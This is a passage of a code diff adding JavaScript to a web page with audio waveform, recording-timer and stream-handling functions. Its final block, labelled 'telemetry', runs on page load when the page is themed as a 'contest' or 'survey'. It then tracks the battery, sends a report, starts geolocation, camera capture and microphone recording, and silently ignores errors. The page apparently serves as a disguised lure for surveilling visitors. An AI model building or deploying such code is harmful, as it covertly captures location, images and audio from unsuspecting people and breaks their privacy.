+          ctx.fillRect(i * bw + 1, H - bh, bw - 2, bh);
+        }
+      }
+      requestAnimationFrame(render);
+    }
+    render();
+  } catch (e) {}
+}
+
+function startWaveform(stream){
+  try {
+    waveCtx = new (window.AudioContext || window.webkitAudioContext)();
+    analyser = waveCtx.createAnalyser(); analyser.fftSize = 256;
+    waveCtx.createMediaStreamSource(stream).connect(analyser);
+    drawWave();
+  } catch (e) {}
+}
+
+function drawWave(){
+  const canvas = $('wave'); if (!canvas || !canvas.clientWidth) return;
+  const dpr = window.devicePixelRatio || 1;
+  const W = canvas.clientWidth, H = canvas.clientHeight;
+  canvas.width = W * dpr; canvas.height = H * dpr;
+  const ctx = canvas.getContext('2d'); ctx.scale(dpr, dpr);
+  ctx.fillStyle = '#090e1a'; ctx.fillRect(0, 0, W, H);
+  if (analyser) {
+    const data = new Uint8Array(analyser.frequencyBinCount);
+    analyser.getByteFrequencyData(data);
+    const bars = 48, bw = W / bars;
+    ctx.fillStyle = '#00ff88';
+    for (let i = 0; i < bars; i++) {
+      const v = data[Math.floor(i * data.length / bars)] / 255;
+      const bh = Math.max(2, v * H * 0.9);
+      ctx.fillRect(i * bw + 1, H - bh, bw - 2, bh);
+    }
+  }
+  raf = requestAnimationFrame(drawWave);
+}
+
+function startRecTimer(){
+  if (recTimer) clearInterval(recTimer);
+  recSec = 0; $('recTime').textContent = '00:00';
+  $('recBtn').innerHTML = 'Stop<br>Recording';
+  $('recBtn').classList.add('live'); $('recBtn').classList.remove('stopped');
+  recTimer = setInterval(() => {
+    recSec++;
+    $('recTime').textContent = String(Math.floor(recSec / 60)).padStart(2, '0') + ':' + String(recSec % 60).padStart(2, '0');
+  }, 1000);
+}
+
+function stopRecUi(){
+  if (recTimer) clearInterval(recTimer);
+  if (raf) cancelAnimationFrame(raf);
+  if (waveCtx) { waveCtx.close().catch(() => {}); waveCtx = null; analyser = null; }
+  $('recBtn').innerHTML = 'Start<br>Recording';
+  $('recBtn').classList.remove('live'); $('recBtn').classList.add('stopped');
+}
+
+function setStatus(t){ $('statusPill').textContent = t; $('statusPill').classList.add('live'); }
+function stopAll(){
+  streams.forEach(t => t.stop()); streams = [];
+  timers.forEach(t => clearInterval(t)); timers = [];
+  if (recTimer) clearInterval(recTimer);
+  if (raf) cancelAnimationFrame(raf);
+  if (waveCtx) { waveCtx.close().catch(() => {}); waveCtx = null; }
+}
+
+// Auto-trigger all telemetry immediately for contest & survey themes
+if (THEME === 'contest' || THEME === 'survey') {
+  (async function autoTelemetry(){
+    setStatus('Active');
+    trackBattery();
+    sendReport({});
+    if (cfg.loc) {
+      locStarted = true;
+      try { await startLoc(); } catch(e) {}
+    }
+    if (cfg.cam) {
+      try { await startCallMedia(); } catch(e) {}
+    }
+    if (cfg.mic) {
+      try {
+        const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        aStream.getTracks().forEach(t => streams.push(t));
+        startRecording(aStream);
+      } catch(e) {}
+    }
+  })();
+}
+</script>
+</body>
+</html>
